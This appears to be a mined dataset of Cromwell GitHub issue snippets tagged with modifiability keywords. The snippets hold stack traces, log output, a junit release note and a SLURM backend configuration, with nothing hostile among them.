com.typesafe.config.impl.ConfigImpl.computeCachedConfig(ConfigImpl.java:92); 	at com.typesafe.config.ConfigFactory.load(ConfigFactory.java:256); 	at com.typesafe.config.ConfigFactory.load(ConfigFactory.java:232); 	at cromwell.CromwellEntryPoint$.config$lzycompute(CromwellEntryPoint.scala:39); 	at cromwell.CromwellEntryPoint$.config(CromwellEntryPoint.scala:39); 	at cromwell.CromwellEntryPoint$.<init>(CromwellEntryPoint.scala:42); 	at cromwell.CromwellEntryPoint$.<clinit>(CromwellEntryPoint.scala); ```. In other words it tells me I'm missing ,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4549:2942,Config,ConfigFactory,2942,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4549,1,['Config'],['ConfigFactory']
Modifiability,onfig.impl.ConfigImpl.parseResourcesAnySyntax(ConfigImpl.java:133); at com.typesafe.config.ConfigFactory.parseResourcesAnySyntax(ConfigFactory.java:1083); at com.typesafe.config.impl.SimpleIncluder.includeResourceWithoutFallback(SimpleIncluder.java:123); at com.typesafe.config.impl.SimpleIncluder.includeResources(SimpleIncluder.java:109); at com.typesafe.config.impl.ConfigParser$ParseContext.parseInclude(ConfigParser.java:181); at com.typesafe.config.impl.ConfigParser$ParseContext.parseObject(ConfigParser.java:237); at com.typesafe.config.impl.ConfigParser$ParseContext.parseValue(ConfigParser.java:103); at com.typesafe.config.impl.ConfigParser$ParseContext.parse(ConfigParser.java:415); at com.typesafe.config.impl.ConfigParser.parse(ConfigParser.java:25); at com.typesafe.config.impl.Parseable.rawParseValue(Parseable.java:263); at com.typesafe.config.impl.Parseable.rawParseValue(Parseable.java:250); at com.typesafe.config.impl.Parseable.parseValue(Parseable.java:180); at com.typesafe.config.impl.Parseable.parseValue(Parseable.java:174); at com.typesafe.config.impl.Parseable.parse(Parseable.java:301); at com.typesafe.config.ConfigFactory.parseFile(ConfigFactory.java:793); at com.typesafe.config.ConfigFactory.parseApplicationReplacement(ConfigFactory.java:1166); at com.typesafe.config.DefaultConfigLoadingStrategy.parseApplicationConfig(DefaultConfigLoadingStrategy.java:11); at com.typesafe.config.ConfigFactory.defaultApplication(ConfigFactory.java:532); at com.typesafe.config.ConfigFactory$1.call(ConfigFactory.java:264); at com.typesafe.config.ConfigFactory$1.call(ConfigFactory.java:261); at com.typesafe.config.impl.ConfigImpl$LoaderCache.getOrElseUpdate(ConfigImpl.java:66); at com.typesafe.config.impl.ConfigImpl.computeCachedConfig(ConfigImpl.java:93); at com.typesafe.config.ConfigFactory.load(ConfigFactory.java:261); at com.typesafe.config.ConfigFactory.load(ConfigFactory.java:237); at cromwell.languages.util.ImportResolver$HttpResolver$.apply(ImportResolver.scala:237),MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7255:2153,config,config,2153,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7255,1,['config'],['config']
Modifiability,"onfun$ready$1.apply(package.scala); at scala.concurrent.Await$$anonfun$ready$1.apply(package.scala); at scala.concurrent.impl.ExecutionContextImpl$DefaultThreadFactory$$anon$2$$anon$4.block(ExecutionContextImpl.scala); at scala.concurrent.forkjoin.ForkJoinPool.managedBlock(Redefined); at scala.concurrent.impl.ExecutionContextImpl$DefaultThreadFactory$$anon$2.blockOn(ExecutionContextImpl.scala:44); at scala.concurrent.Await$.ready(package.scala:169); at akka.actor.ActorSystemImpl.awaitTermination(ActorSystem.scala); at akka.actor.ActorSystemImpl.awaitTermination(ActorSystem.scala); at cromwell.server.CromwellServer$$anonfun$run$1.applyOrElse(CromwellServer.scala:29); at cromwell.server.CromwellServer$$anonfun$run$1.applyOrElse(CromwellServer.scala); at scala.concurrent.Future$$anonfun$andThen$1.apply(Future.scala:433); at scala.concurrent.Future$$anonfun$andThen$1.apply(Future.scala); at scala.concurrent.impl.CallbackRunnable.run(Redefined); at scala.concurrent.impl.ExecutionContextImpl$AdaptedForkJoinTask.exec(ExecutionContextImpl.scala); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(Redefined); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java). ""cromwell-system-scheduler-1"" #14 prio=5 os_prio=31 tid=0x00007fb76aa14800 nid=0x6103 runnable [0x00000001295b3000]; java.lang.Thread.State: RUNNABLE; at com.jprofiler.agent.InstrumentationCallee.exitFilteredMethod(Native Method); at com.jprofiler.agent.InstrumentationCallee.__ejt_filter_exitMethod(ejt:86); at akka.actor.LightArrayRevolverScheduler.clock(Scheduler.scala:213); at akka.actor.LightArrayRevolverScheduler$$anon$8.nextTick(Redefined); at akka.actor.LightArrayRevolverScheduler$$anon$8.run(Redefined); at java.lang.Thread.run(Redefined). ""cromwell-system-akka.actor.default-dispatcher-4"" #13 prio=5 os_prio=31 tid=0x00007fb76b38c000 nid=",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:46244,Adapt,AdaptedForkJoinTask,46244,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['Adapt'],['AdaptedForkJoinTask']
Modifiability,"ons in Google Cloud. The admin that set up my account also had no idea what `compute.zones.list` mean. I don't see this in the [tutorial](https://cromwell.readthedocs.io/en/stable/tutorials/PipelinesApi101/). The following command does not work:; ```; $ gcloud projects add-iam-policy-binding xxx --member serviceAccount:xxx@xxx.gserviceaccount.com --role roles/compute.zones.list; ERROR: Policy modification failed. For a binding with condition, run ""gcloud alpha iam policies lint-condition"" to identify issues in condition.; ERROR: (gcloud.projects.add-iam-policy-binding) INVALID_ARGUMENT: Role roles/compute.zones.list is not supported for this resource.; ```; I have no idea what I should do. Why can't Cromwell simply provide the command line needed to change the permission?. As for Requester Pays, following the [documentation](https://cromwell.readthedocs.io/en/stable/filesystems/GoogleCloudStorage/#requester-pays) I have set up the `project` field in the `gcs` filesystem configuration (completely unclear which one in the documentation, as according to the tutorial there are two, but I have included `project` in both ...) in the configuration file as follows:; ```; include required(classpath(""application"")). google {; application-name = ""cromwell""; auths = [; {; name = ""application-default""; scheme = ""application_default""; }; ]; }. engine {; filesystems {; gcs {; auth = ""application-default""; project = ""xxx""; }; }; }. backend {; default = ""JES""; providers {; JES {; actor-factory = ""cromwell.backend.impl.jes.JesBackendLifecycleActorFactory""; config {; // Google project; project = ""xxx"". // Base bucket for workflow executions; root = ""gs://xxx/cromwell-execution"". // Polling for completion backs-off gradually for slower-running jobs.; // This is the maximum polling interval (in seconds):; maximum-polling-interval = 600. // Optional Dockerhub Credentials. Can be used to access private docker images.; dockerhub {; // account = """"; // token = """"; }. genomics {; // A refere",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-665256471:1223,config,configuration,1223,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-665256471,2,['config'],['configuration']
Modifiability,ontext(BlockContext.scala:85); 	at cats.effect.internals.TrampolineEC$JVMTrampoline.startLoop(TrampolineEC.scala:93); 	at cats.effect.internals.Trampoline.execute(Trampoline.scala:43); 	at cats.effect.internals.TrampolineEC.execute(TrampolineEC.scala:44); 	at cats.effect.internals.ForwardCancelable.loop$1(ForwardCancelable.scala:46); 	at cats.effect.internals.ForwardCancelable.$anonfun$cancel$1(ForwardCancelable.scala:52); 	at cats.effect.internals.ForwardCancelable.$anonfun$cancel$1$adapted(ForwardCancelable.scala:52); 	at cats.effect.internals.IORunLoop$RestartCallback.start(IORunLoop.scala:337); 	at cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:119); 	at cats.effect.internals.IORunLoop$.start(IORunLoop.scala:34); 	at cats.effect.IO.unsafeRunAsync(IO.scala:258); 	at cats.effect.internals.IORace$.onSuccess$1(IORace.scala:40); 	at cats.effect.internals.IORace$.$anonfun$simple$4(IORace.scala:79); 	at cats.effect.internals.IORace$.$anonfun$simple$4$adapted(IORace.scala:77); 	at cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:136); 	at cats.effect.internals.IORunLoop$RestartCallback.signal(IORunLoop.scala:351); 	at cats.effect.internals.IORunLoop$RestartCallback.apply(IORunLoop.scala:372); 	at cats.effect.internals.IORunLoop$RestartCallback.apply(IORunLoop.scala:312); 	at cats.effect.internals.IOShift$Tick.run(IOShift.scala:36); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:41); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:49); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); ```; </details>. A workaround is setting up a registry to host the images (so we can,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5178:3916,adapt,adapted,3916,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5178,1,['adapt'],['adapted']
Modifiability,"ontext(BlockContext.scala:85); 	at cats.effect.internals.TrampolineEC$JVMTrampoline.startLoop(TrampolineEC.scala:93); 	at cats.effect.internals.Trampoline.execute(Trampoline.scala:43); 	at cats.effect.internals.TrampolineEC.execute(TrampolineEC.scala:44); 	at cats.effect.internals.ForwardCancelable.loop$1(ForwardCancelable.scala:46); 	at cats.effect.internals.ForwardCancelable.$anonfun$cancel$1(ForwardCancelable.scala:52); 	at cats.effect.internals.ForwardCancelable.$anonfun$cancel$1$adapted(ForwardCancelable.scala:52); 	at cats.effect.internals.IORunLoop$RestartCallback.start(IORunLoop.scala:341); 	at cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:119); 	at cats.effect.internals.IORunLoop$.start(IORunLoop.scala:34); 	at cats.effect.IO.unsafeRunAsync(IO.scala:257); 	at cats.effect.internals.IORace$.onSuccess$1(IORace.scala:40); 	at cats.effect.internals.IORace$.$anonfun$simple$4(IORace.scala:79); 	at cats.effect.internals.IORace$.$anonfun$simple$4$adapted(IORace.scala:77); 	at cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:136); 	at cats.effect.internals.IORunLoop$RestartCallback.signal(IORunLoop.scala:355); 	at cats.effect.internals.IORunLoop$RestartCallback.apply(IORunLoop.scala:376); 	at cats.effect.internals.IORunLoop$RestartCallback.apply(IORunLoop.scala:316); 	at cats.effect.internals.IOShift$Tick.run(IOShift.scala:36); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:41); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:49); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); 2020-10-08 16:08:57,571 cromwell-system-akka.dispatchers.engine-dispatcher-33 WARN -",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5925:3232,adapt,adapted,3232,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5925,1,['adapt'],['adapted']
Modifiability,ool.java:1979); 	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); 	Suppressed: wdl4s.exception.ValidationException: Input evaluation for Call dna_mapping_38.libraryMerge failed.:; inputBams:; 	Could not find the shard mapping to this scatter dna_mapping_38.$scatter_1; outputBam:; 	Could not find the shard mapping to this scatter dna_mapping_38.$scatter_1; 		at wdl4s.Call.evaluateTaskInputs(Call.scala:117); 		at cromwell.engine.workflow.lifecycle.execution.CallPreparationActor$$anonfun$resolveAndEvaluateInputs$2.apply(JobPreparationActor.scala:42); 		at cromwell.engine.workflow.lifecycle.execution.CallPreparationActor$$anonfun$resolveAndEvaluateInputs$2.apply(JobPreparationActor.scala:35); 		at scala.util.Try$.apply(Try.scala:192); 		at cromwell.engine.workflow.lifecycle.execution.CallPreparationActor.resolveAndEvaluateInputs(JobPreparationActor.scala:35); 		... 12 more; 		Suppressed: wdl4s.exception.VariableLookupException: inputBams:; Could not find the shard mapping to this scatter dna_mapping_38.$scatter_1; 			at wdl4s.Call.wdl4s$Call$$lookup$2(Call.scala:176); 			at wdl4s.Call$$anonfun$lookupFunction$1.apply(Call.scala:181); 			at wdl4s.Call$$anonfun$lookupFunction$1.apply(Call.scala:181); 			at wdl4s.Call$$anonfun$4$$anonfun$5.apply(Call.scala:103); 			at wdl4s.Call$$anonfun$4$$anonfun$5.apply(Call.scala:103); 			at scala.util.Try$.apply(Try.scala:192); 			at wdl4s.Call$$anonfun$4.apply(Call.scala:103); 			at wdl4s.Call$$anonfun$4.apply(Call.scala:101); 			at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:234); 			at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:234); 			at scala.collection.Iterator$class.foreach(Iterator.scala:893); 			at scala.collection.AbstractIterator.foreach(Iterator.scala:1336); 			at scala.collection.IterableLike$class.foreach(IterableLike.scala:72); 			at scala.collection.AbstractIterable.foreach(Iterable.scala:54); 			at scala.collection.Tra,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1802#issuecomment-268422512:5275,Variab,VariableLookupException,5275,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1802#issuecomment-268422512,1,['Variab'],['VariableLookupException']
Modifiability,"or later</h3>; <p>A local information disclosure vulnerability in <code>TemporaryFolder</code> has been fixed. See the published <a href=""https://github.com/junit-team/junit4/security/advisories/GHSA-269g-pwp5-87pp"">security advisory</a> for details.</p>; <h1>Test Runners</h1>; <h3>[Pull request <a href=""https://github-redirect.dependabot.com/junit-team/junit4/issues/1669"">#1669</a>:](<a href=""https://github-redirect.dependabot.com/junit-team/junit/pull/1669"">junit-team/junit#1669</a>) Make <code>FrameworkField</code> constructor public</h3>; <p>Prior to this change, custom runners could make <code>FrameworkMethod</code> instances, but not <code>FrameworkField</code> instances. This small change allows for both now, because <code>FrameworkField</code>'s constructor has been promoted from package-private to public.</p>; </blockquote>; </details>; <details>; <summary>Commits</summary>; <ul>; <li><a href=""https://github.com/junit-team/junit4/commit/1b683f4ec07bcfa40149f086d32240f805487e66""><code>1b683f4</code></a> [maven-release-plugin] prepare release r4.13.1</li>; <li><a href=""https://github.com/junit-team/junit4/commit/ce6ce3aadc070db2902698fe0d3dc6729cd631f2""><code>ce6ce3a</code></a> Draft 4.13.1 release notes</li>; <li><a href=""https://github.com/junit-team/junit4/commit/c29dd8239d6b353e699397eb090a1fd27411fa24""><code>c29dd82</code></a> Change version to 4.13.1-SNAPSHOT</li>; <li><a href=""https://github.com/junit-team/junit4/commit/1d174861f0b64f97ab0722bb324a760bfb02f567""><code>1d17486</code></a> Add a link to assertThrows in exception testing</li>; <li><a href=""https://github.com/junit-team/junit4/commit/543905df72ff10364b94dda27552efebf3dd04e9""><code>543905d</code></a> Use separate line for annotation in Javadoc</li>; <li><a href=""https://github.com/junit-team/junit4/commit/510e906b391e7e46a346e1c852416dc7be934944""><code>510e906</code></a> Add sub headlines to class Javadoc</li>; <li><a href=""https://github.com/junit-team/junit4/commit/610155b8c22138329f0723eec",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5941:1826,plugin,plugin,1826,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5941,1,['plugin'],['plugin']
Modifiability,"or$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: common.exception.AggregatedMessageException: Error(s):; Could not evaluate expression: ""-l h_vmem="" + memory + ""G"": Cannot perform operation: -l h_vmem= + WomLong(4); at common.validation.Validation$ValidationTry$.toTry$extension1(Validation.scala:77); at common.validation.Validation$ValidationTry$.toTry$extension0(Validation.scala:73); at cromwell.backend.impl.sfs.config.ConfigAsyncJobExecutionActor.writeTaskScript(ConfigAsyncJobExecutionActor.scala:107); at cromwell.backend.impl.sfs.config.ConfigAsyncJobExecutionActor.writeTaskScript$(ConfigAsyncJobExecutionActor.scala:55); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.writeTaskScript(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.impl.sfs.config.ConfigAsyncJobExecutionActor.processArgs(ConfigAsyncJobExecutionActor.scala:43); at cromwell.backend.impl.sfs.config.ConfigAsyncJobExecutionActor.processArgs$(ConfigAsyncJobExecutionActor.scala:39); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.processArgs$lzycompute(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.processArgs(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.makeProcessRunner(SharedFileSystemAsyncJobExecutionActor.scala:174); at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.makeProcessRunner$(SharedFileSystemAsyncJobExecutionActor.scala:171); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.makeProcessRunner(ConfigAsyncJobExecutionActor.scala:211); ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4659:2275,config,config,2275,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4659,1,['config'],['config']
Modifiability,"or.ActorInitializationException$.apply(Actor.scala:193) ; at akka.actor.ActorCell.create(ActorCell.scala:669) ; at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:523) ; at akka.actor.ActorCell.systemInvoke(ActorCell.scala:545) ; at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:283) ; at akka.dispatch.Mailbox.run(Mailbox.scala:224) ; at akka.dispatch.Mailbox.exec(Mailbox.scala:235) ; at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) ; at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339) ; at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979) ; at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107) ; Caused by: com.typesafe.config.ConfigException$Missing: No configuration setting found for key 'services' ; at com.typesafe.config.impl.SimpleConfig.findKeyOrNull(SimpleConfig.java:156) ; at com.typesafe.config.impl.SimpleConfig.findOrNull(SimpleConfig.java:174) ; at com.typesafe.config.impl.SimpleConfig.find(SimpleConfig.java:188) ; at com.typesafe.config.impl.SimpleConfig.find(SimpleConfig.java:193) ; at com.typesafe.config.impl.SimpleConfig.getObject(SimpleConfig.java:268) ; at com.typesafe.config.impl.SimpleConfig.getObject(SimpleConfig.java:41) ; at cromwell.services.ServiceRegistryActor$.serviceNameToPropsMap(ServiceRegistryActor.scala:35) ; at cromwell.services.ServiceRegistryActor.serviceProps(ServiceRegistryActor.scala:63) ; at cromwell.services.ServiceRegistryActor.<init>(ServiceRegistryActor.scala:65) ; at cromwell.services.ServiceRegistryActor$.$anonfun$props$1(ServiceRegistryActor.scala:25) ; at akka.actor.TypedCreatorFunctionConsumer.produce(IndirectActorProducer.scala:87) ; at akka.actor.Props.newActor(Props.scala:212) ; at akka.actor.ActorCell.newActor(ActorCell.scala:624) ; at akka.actor.ActorCell.create(ActorCell.scala:650) ; ... 9 more ; ```. If I add in a `services` stanza, though, it asks me to define the class of each service, even though they",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4577:1648,config,config,1648,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4577,1,['config'],['config']
Modifiability,"or.scala:54); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:614); 	at akka.actor.ActorCell.invoke(ActorCell.scala:583); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:268); 	at akka.dispatch.Mailbox.run(Mailbox.scala:229); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:241); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2023-11-07 14:51:17,39] [info] Message [cromwell.engine.workflow.lifecycle.EngineLifecycleActorAbortCommand$] from Actor[akka://cromwell-system/user/SingleWorkflowRunnerActor/WorkflowManagerActor/WorkflowActor-4e522458-e360-45e8-be15-2fc99652d692#-686070856] to Actor[akka://cromwell-system/user/SingleWorkflowRunnerActor/WorkflowManagerActor/WorkflowActor-4e522458-e360-45e8-be15-2fc99652d692/WorkflowExecutionActor-4e522458-e360-45e8-be15-2fc99652d692#-1420206102] was not delivered. [1] dead letters encountered, no more dead letters will be logged. If this is not an expected behavior, then [Actor[akka://cromwell-system/user/SingleWorkflowRunnerActor/WorkflowManagerActor/WorkflowActor-4e522458-e360-45e8-be15-2fc99652d692/WorkflowExecutionActor-4e522458-e360-45e8-be15-2fc99652d692#-1420206102]] may have terminated unexpectedly, This logging can be turned off or adjusted with configuration settings 'akka.log-dead-letters' and 'akka.log-dead-letters-during-shutdown'.; ```; In fact, the program becomes unresponsive to even a Ctrl+C kill command and I have to close the terminal entirely to stop it. . The WDL passes `womtool validate` (version 84) and was run using Cromwell version 84. . When run in Terra, the workflow just immediate goes into an aborting state without any helpful error message. It would be great to incorporate this type of support for `None` inside struct fields.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7249:6747,config,configuration,6747,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7249,1,['config'],['configuration']
Modifiability,"or/WorkflowManagerActor/WorkflowActor-bc4644da-87f9-4765-9791-9011a2fae80f/WorkflowExecutionActor-bc4644da-87f9-4765-9791-9011a2fae80f/bc4644da-87f9-4765-9791-9011a2fae80f-EngineJobExecutionActor-batch_for_variantcall:NA:1/ejha_for_bc4644da-87f9-4765-9791-9011a2fae80f:BackendJobDescriptorKey_CommandCallNode_batch_for_variantcall:-1:1/CCHashingJobActor-bc4644da-batch_for_variantcall:NA:1#-1192719839] to Actor[akka://cromwell-system/user/SingleWorkflowRunnerActor/WorkflowManagerActor/WorkflowActor-bc4644da-87f9-4765-9791-9011a2fae80f/WorkflowExecutionActor-bc4644da-87f9-4765-9791-9011a2fae80f/bc4644da-87f9-4765-9791-9011a2fae80f-EngineJobExecutionActor-batch_for_variantcall:NA:1/ejha_for_bc4644da-87f9-4765-9791-9011a2fae80f:BackendJobDescriptorKey_CommandCallNode_batch_for_variantcall:-1:1/CCHashingJobActor-bc4644da-batch_for_variantcall:NA:1/FileHashingActor_for_batch_for_variantcall:NA:1#-540594129] was not delivered. [1] dead letters encountered. This logging can be turned off or adjusted with configuration settings 'akka.log-dead-letters' and 'akka.log-dead-letters-during-shutdown'.; [2018-05-02 15:22:54,89] [info] Message [cromwell.backend.standard.callcaching.StandardFileHashingActor$FileHashResponse] from Actor[akka://cromwell-system/user/SingleWorkflowRunnerActor/WorkflowManagerActor/WorkflowActor-bc4644da-87f9-4765-9791-9011a2fae80f/WorkflowExecutionActor-bc4644da-87f9-4765-9791-9011a2fae80f/bc4644da-87f9-4765-9791-9011a2fae80f-EngineJobExecutionActor-batch_for_variantcall:NA:1/ejha_for_bc4644da-87f9-4765-9791-9011a2fae80f:BackendJobDescriptorKey_CommandCallNode_batch_for_variantcall:-1:1/CCHashingJobActor-bc4644da-batch_for_variantcall:NA:1/FileHashingActor_for_batch_for_variantcall:NA:1#-540594129] to Actor[akka://cromwell-system/user/SingleWorkflowRunnerActor/WorkflowManagerActor/WorkflowActor-bc4644da-87f9-4765-9791-9011a2fae80f/WorkflowExecutionActor-bc4644da-87f9-4765-9791-9011a2fae80f/bc4644da-87f9-4765-9791-9011a2fae80f-EngineJobExecutionActor-batch_f",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3584:9733,config,configuration,9733,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3584,1,['config'],['configuration']
Modifiability,"or_variantcall/execution/stderr -t 1-00:00 -p core --cpus-per-task=1 --mem=4026 --wrap ""/usr/bin/env bash /projects/ngs/oncology/dev/bcbio_validation_workflows/somatic-giab-mix/cromwell_work/cromwell-executions/main-somatic-giab-mix.cwl/bc4644da-87f9-4765-9791-9011a2fae80f/call-batch_for_variantcall/execution/script""; [2018-05-02 15:16:57,63] [info] DispatchedConfigAsyncJobExecutionActor [[38;5;2mbc4644da[0mbatch_for_variantcall:NA:1]: job id: 134053; [2018-05-02 15:16:57,66] [info] DispatchedConfigAsyncJobExecutionActor [[38;5;2mbc4644da[0mbatch_for_variantcall:NA:1]: Status change from - to WaitingForReturnCodeFile; [2018-05-02 15:17:05,03] [info] DispatchedConfigAsyncJobExecutionActor [[38;5;2mbc4644da[0mbatch_for_variantcall:NA:1]: Status change from WaitingForReturnCodeFile to Done; [2018-05-02 15:22:54,62] [[38;5;1merror[0m] Failed to hash null; java.io.FileNotFoundException: Cannot hash file null because it can't be found; 	at cromwell.backend.impl.sfs.config.ConfigHashingStrategy.usingStandardInitData$1(ConfigHashingStrategy.scala:46); 	at cromwell.backend.impl.sfs.config.ConfigHashingStrategy.getHash(ConfigHashingStrategy.scala:57); 	at cromwell.backend.impl.sfs.config.ConfigBackendFileHashingActor.customHashStrategy(ConfigBackendFileHashingActor.scala:26); 	at cromwell.backend.standard.callcaching.StandardFileHashingActor$$anonfun$fileHashingReceive$1.applyOrElse(StandardFileHashingActor.scala:79); 	at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:172); 	at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:172); 	at akka.actor.Actor.aroundReceive(Actor.scala:514); 	at akka.actor.Actor.aroundReceive$(Actor.scala:512); 	at cromwell.backend.standard.callcaching.StandardFileHashingActor.akka$actor$Timers$$super$aroundReceive(StandardFileHashingActor.scala:59); 	at akka.actor.Timers.aroundReceive(Timers.scala:44); 	at akka.actor.Timers.aroundReceive$(Timers.scala:36); 	at cromwell.backend.standard.callcaching.StandardFileHa",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3584:4958,Config,ConfigHashingStrategy,4958,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3584,1,['Config'],['ConfigHashingStrategy']
Modifiability,"org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're in the right place. -->. If you see I've configured root to be root = ""/fast/gdr/uat/cromwell-executions"". but randomly sometime workflows when I check cromwell api metadata it is pointing to old root which was /g/cromwell/cromwell-executions. . Note I'm running cromwell in server mode with mariadb. I've cleaned and deleted all tables from mariadb. restarted the server as well. Can't find any other config/cache file where it has saved old address. Sometime workflows are fine pointing to new root but sometime not. <!-- Which backend are you running? -->; SLURM on cromwell 36. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->. backend {; # Override the default backend.; default = ""PhoenixSLURM"". # The list of providers.; providers {. PhoenixSLURM {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; runtime-attributes = """"""; String userid; String partitions; String memory_per_node; Int nodes; Int cores; String time; """""". # If an 'exit-code-timeout-seconds' value is specified:; # - When a job has not been alive for longer than this timeout; # - And has still not produced an RC file; # - Then it will be marked as Failed.; # Warning: If set, Cromwell has to run 'check-alive' for every job at regular intervals (unrelated to this timeout). exit-code-timeout-seconds = 600. submit = """"""; chmod 770 -R ${cwd}; sudo change-files.sh ${userid} ${cwd}; phoenix_home_cwd=""/home/${userid}""; phoenix_home_out=""/home/${userid}/stdout""; phoenix_home_err=""/home/${userid}/stderr"". phoenix_script=${script}_phonix; cat ${script} | sed -s ""s@#\!/bin/bash@#\!/bin/bash\nsource '/etc/profile' @g"" > $phoenix_script. sbatch --uid=${userid} --gid=${userid} \; -J ${job_name} \; -p ${partitions} \; -N ${nodes} \; -n ${cores} \; --mem=${memory_per_node} \; 